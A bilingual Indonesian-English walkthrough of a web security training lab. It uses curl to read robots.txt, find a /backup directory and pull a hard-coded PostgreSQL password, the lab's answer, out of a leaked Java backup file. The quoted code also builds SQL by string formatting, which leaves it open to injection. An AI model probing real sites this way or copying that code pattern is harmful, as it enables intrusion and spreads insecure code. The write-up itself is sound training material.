# Lab: Source code disclosure via backup files

**Category**: Information Disclosure / Source Code Disclosure  
**Goal**: Mengidentifikasi direktori tersembunyi (*hidden directory*) tempat ditemukannya file cadangan (*backup file*) source code, lalu menguji *hard-coded credentials* (password database PostgreSQL) untuk menyelesaikan lab.  
*Discover a hidden directory (`/backup`) containing a source code backup file (`ProductTemplate.java.bak`), extract the hard-coded PostgreSQL database password, and submit it to solve the lab.*

---

## 📌 Overview & Prerequisite Knowledge / Gambaran Umum & Pengetahuan Dasar

- **Information Disclosure (Kebocoran Informasi)**: 
  Kerentanan di mana aplikasi web secara tidak sengaja membocorkan informasi sensitif (seperti source code, file konfigurasi, atau *backup files*) kepada publik.
  *Vulnerability where a web application inadvertently exposes sensitive info (source code, configuration files, backup files) to unauthorized users.*
- **`robots.txt` Disclosure**: 
  File `robots.txt` digunakan untuk memberikan petunjuk kepada mesin pencari (*web crawlers*) mengenai direktori mana yang boleh/tidak boleh di-index. Sering kali direktori yang terdaftar di `Disallow:` justru mengungkap lokasi folder rahasia/sensitif seperti `/backup` atau `/admin`.
  *Files listed under `Disallow:` in `robots.txt` often inadvertently reveal sensitive hidden directories to attackers.*
- **Hard-coded Credentials**: 
  Praktik buruk menyimpang (*anti-pattern*) di mana pengembang menanamkan password database, API key, atau rahasia lainnya secara langsung di dalam source code aplikasi.
  *Anti-pattern of embedding database passwords, API keys, or secret tokens directly inside application source code.*

---

## 🎯 Solution Summary / Ringkasan Solusi

1. **ID**: Akses file `/robots.txt` pada web target untuk menemukan direktori sensitif yang dilarang (`Disallow: /backup`).  
   **EN**: Browse to `/robots.txt` on the target application to identify restricted directories (`Disallow: /backup`).
2. **ID**: Telusuri direktori `/backup` untuk mengidentifikasi keberadaan file cadangan source code `ProductTemplate.java.bak`.  
   **EN**: Navigate to `/backup` to find the source code backup file `ProductTemplate.java.bak`.
3. **ID**: Unduh atau baca isi file `/backup/ProductTemplate.java.bak` untuk menganalisis source code Java.  
   **EN**: Fetch and read `/backup/ProductTemplate.java.bak` to analyze the Java source code.
4. **ID**: Temukan *hard-coded database password* pada objek `ConnectionBuilder` PostgreSQL (misalnya: `pyf3g3r21zz3ln76opgl5ekr8ug6eojn`).  
   **EN**: Locate the hard-coded PostgreSQL database password inside the `ConnectionBuilder` initialization (e.g., `pyf3g3r21zz3ln76opgl5ekr8ug6eojn`).
5. **ID**: Klik **Submit solution** pada lab, lalu masukkan password database tersebut untuk menyelesaikan lab.  
   **EN**: Click **Submit solution** and submit the database password to complete the lab.

![Solution Overview](../../Image%20Asset/Source%20code%20disclosure/Lab%20Backup%20File%20Source%20code%20disclosure%20via%20backup%20files.png)

---

## 🛠️ Step-by-Step Guide / Panduan Langkah demi Langkah

### Step 1: Reconnaissance via `robots.txt` / Pemindaian awal `robots.txt`

**ID**: Akses file `/robots.txt` melalui browser atau Terminal Linux (`curl`):  
**EN**: Fetch `/robots.txt` using browser or `curl`:

```bash
curl -s https://0a9500970318e3d88019762200bd0002.web-security-academy.net/robots.txt
```

Output:
```http
User-agent: *
Disallow: /backup
```

> [!NOTE]
> File `robots.txt` secara eksplisit menunjukkan direktori `/backup` yang disembunyikan dari web crawler.  
> *The `robots.txt` file explicitly reveals the hidden `/backup` directory.*

---

### Step 2: Directory Listing pada Hidden Folder `/backup` / Memeriksa Direktori Tersembunyi `/backup`

**ID**: Akses direktori `/backup` melalui terminal (`curl`) atau browser:  
**EN**: Access `/backup` via `curl` or browser:

```bash
curl -s https://0a9500970318e3d88019762200bd0002.web-security-academy.net/backup
```

Output:
```html
<html>
    <head>
        <title>Index of /backup</title>
    </head>
    <body>
        <h1>Index of /backup</h1>
        <table>
            <tr><th>Name</th><th>Size</th></tr>
            <tr><td><a href='/backup/ProductTemplate.java.bak'>ProductTemplate.java.bak</a></td><td>1647B</td></tr>
        </table>
    </body>
</html>
```

---

### Step 3: Inspect Source Code & Extract Hard-coded Credentials / Analisis Source Code & Ekstraksi Password

**ID**: Unduh dan baca konten file `/backup/ProductTemplate.java.bak` menggunakan `curl`:  
**EN**: Fetch and inspect `/backup/ProductTemplate.java.bak` using `curl`:

```bash
curl -s https://0a9500970318e3d88019762200bd0002.web-security-academy.net/backup/ProductTemplate.java.bak
```

Isi Source Code Java / Java Source Code:
```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "pyf3g3r21zz3ln76opgl5ekr8ug6eojn" // Hard-coded Database Password
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId() { return id; }
    public Product getProduct() { return product; }
}
```

> [!NOTE]
> **Hard-coded Credentials**:  
> PostgreSQL Database Password = `pyf3g3r21zz3ln76opgl5ekr8ug6eojn`

---

### Step 4: Submit Solution / Submit Jawaban

**ID**: Kembali ke halaman utama aplikasi web di browser, klik tombol **Submit solution**, lalu masukkan password database tersebut: `pyf3g3r21zz3ln76opgl5ekr8ug6eojn`.  
**EN**: Return to the lab page, click **Submit solution**, and submit the database password: `pyf3g3r21zz3ln76opgl5ekr8ug6eojn`.

![Lab Solved Confirmation](../../Image%20Asset/Source%20code%20disclosure/Pasted%20image%2020260804194452.png)

> [!SUCCESS]
> **Lab Solved**: Password database berhasil disubmit dan lab dinyatakan selesai!  
> *Database password successfully submitted and lab completed!*